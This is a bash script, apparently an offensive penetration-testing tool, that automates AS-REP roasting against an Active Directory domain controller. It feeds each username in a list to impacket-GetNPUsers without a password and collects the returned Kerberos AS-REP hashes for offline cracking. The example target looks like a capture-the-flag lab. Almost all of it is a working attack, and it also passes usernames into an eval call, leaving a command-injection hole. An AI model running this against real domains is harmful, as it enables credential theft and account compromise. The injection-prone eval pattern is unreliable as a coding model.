#!/usr/bin/env bash

# ========================================================================================
# asrep_roast.sh - AS-REP Roasting Script for Active Directory
# Enumerates users from a specified file for AS-REP roastable accounts using impacket-GetNPUsers
# ========================================================================================

# ------------------------------------
# Global Variables and Defaults
# ------------------------------------
SCRIPT_DIR="$(dirname "$0")"
OUTPUT_DIR="$SCRIPT_DIR/asrep_outputs"
mkdir -p "$OUTPUT_DIR"

LOG_FILE="$SCRIPT_DIR/asrep_roast.log"
DATE_TIME="$(date +%Y%m%d_%H%M)"
REPORT_FILE="$OUTPUT_DIR/${DATE_TIME}_asrep_report.txt"

DOMAIN=""
DC_IP=""
USERS_FILE=""

# ------------------------------------
# Logging Functions
# ------------------------------------
log() {
    local type="$1"
    local msg="$2"
    local timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
    echo "[$timestamp] [$type] $msg" | tee -a "$LOG_FILE" >> "$REPORT_FILE"
}

append_to_report() {
    local section="$1"
    local message="$2"
    echo -e "\n---------- $section ----------" >> "$REPORT_FILE"
    echo -e "[$(date '+%Y-%m-%d %H:%M:%S')] $message" >> "$REPORT_FILE"
}

# ------------------------------------
# Help Message
# ------------------------------------
print_help() {
    cat << EOF
Usage: $0 -u <users_file> -i <dc_ip> -d <domain> [-h|--help]

AS-REP Roasting Script for Active Directory

Options:
  -u <users_file>   Path to file containing usernames (one per line, required)
  -i <dc_ip>        IP address of the Domain Controller (required)
  -d <domain>       Domain name (e.g., BLACKFIELD.local, required)
  -h, --help        Show this help message and exit

Example:
  ./asrep_roast.sh -u users.txt -i 10.10.10.192 -d BLACKFIELD.local

The script enumerates users from the specified file for AS-REP roastable accounts using impacket-GetNPUsers, saving results to $OUTPUT_DIR/asrep_hashes.txt and $REPORT_FILE.
EOF
    exit 0
}

# ------------------------------------
# Argument Parsing
# ------------------------------------
parse_args() {
    while [[ $# -gt 0 ]]; do
        case "$1" in
            -u)
                USERS_FILE="$2"
                shift 2
                ;;
            -i)
                DC_IP="$2"
                shift 2
                ;;
            -d)
                DOMAIN="$2"
                shift 2
                ;;
            -h|--help)
                print_help
                ;;
            *)
                log "ERROR" "Unknown argument: $1"
                print_help
                exit 1
                ;;
        esac
    done

    # Check if required arguments are provided
    if [[ -z "$USERS_FILE" ]]; then
        log "ERROR" "Users file not specified. Use -u <users_file>"
        print_help
        exit 1
    fi
    if [[ -z "$DC_IP" ]]; then
        log "ERROR" "DC IP not specified. Use -i <dc_ip>"
        print_help
        exit 1
    fi
    if [[ -z "$DOMAIN" ]]; then
        log "ERROR" "Domain not specified. Use -d <domain>"
        print_help
        exit 1
    fi
}

# ------------------------------------
# Root Privilege Check
# ------------------------------------
check_root() {
    if [[ $(id -u) -ne 0 ]]; then
        log "ERROR" "Script must run as root. Use sudo."
        exit 1
    else
        export trueRoot=true
        [[ "$QUIET_MODE" = false ]] && echo "[+] SCRIPT IS RUNNING AS ROOT"
        log "INFO" "Script is running as root."
    fi
}

# ------------------------------------
# Input Validation
# ------------------------------------
validate_inputs() {
    # Check if users file exists
    if [[ ! -f "$USERS_FILE" ]]; then
        log "ERROR" "Users file not found: $USERS_FILE"
        exit 1
    fi

    # Validate DC_IP format (basic IPv4 check)
    if ! [[ "$DC_IP" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
        log "ERROR" "Invalid IPv4 format for DC_IP: $DC_IP. Use xxx.xxx.xxx.xxx"
        exit 1
    fi

    # Check if impacket-GetNPUsers is installed
    if ! command -v impacket-GetNPUsers >/dev/null 2>&1; then
        log "ERROR" "impacket-GetNPUsers is not installed. Install with 'pip install impacket'"
        exit 1
    fi
}

# ------------------------------------
# Connectivity Check
# ------------------------------------
test_connectivity() {
    if ping -c 1 -W 2 "$DC_IP" >/dev/null 2>&1; then
        log "INFO" "Domain controller $DC_IP is reachable"
    else
        log "ERROR" "Ping to $DC_IP failed"
        exit 1
    fi

    # Check if Kerberos port (88) is open
    if ! nc -z -w 2 "$DC_IP" 88 >/dev/null 2>&1; then
        log "ERROR" "Kerberos port 88 is not open on $DC_IP"
        exit 1
    fi
}

# ------------------------------------
# AS-REP Roasting
# ------------------------------------
execute_asrep_roast() {
    log "INFO" "Starting AS-REP roasting for users in $USERS_FILE"
    echo "[+] Starting AS-REP roasting for users in $USERS_FILE"
    local count=0
    while IFS= read -r user; do
        if [[ -n "$user" ]]; then
            echo "[*] Testing user: $user"
            CMD="impacket-GetNPUsers -dc-ip '$DC_IP' -no-pass -request '$DOMAIN/$user'"
            log "INFO" "Executing: $CMD"
            OUT=$(eval "$CMD" 2>&1 | grep krb5asrep)
            if [[ -n "$OUT" ]]; then
                echo "[+] Found AS-REP roastable user: $user"
                echo "[+] AS-REP Hash: $OUT"
                echo "$OUT" >> "$OUTPUT_DIR/asrep_hashes.txt"
                append_to_report "AS-REP Roast: $user" "$OUT"
                ((count++))
                log "INFO" "Found AS-REP roastable user: $user"
            else
                echo "[-] No AS-REP roastable hash for user: $user"
            fi
        fi
    done < "$USERS_FILE"
    log "INFO" "AS-REP roasting completed. Found $count roastable users."
    echo "[+] AS-REP roasting completed. Found $count roastable users."
}

# ------------------------------------
# Main Execution
# ------------------------------------
main() {
    check_root
    parse_args "$@"
    log "INFO" "Starting AS-REP Roasting Script"
    echo "[+] Starting AS-REP Roasting Script at $(date '+%Y-%m-%d %H:%M:%S')"
    log "INFO" "Configuration: DOMAIN=$DOMAIN, DC_IP=$DC_IP, USERS_FILE=$USERS_FILE"
    echo "[+] Configuration: DOMAIN=$DOMAIN, DC_IP=$DC_IP, USERS_FILE=$USERS_FILE"
    
    validate_inputs
    test_connectivity
    execute_asrep_roast
    
    log "INFO" "Results saved to $OUTPUT_DIR/asrep_hashes.txt and $REPORT_FILE"
    echo "[+] Results saved to $OUTPUT_DIR/asrep_hashes.txt and $REPORT_FILE"
}

main "$@"
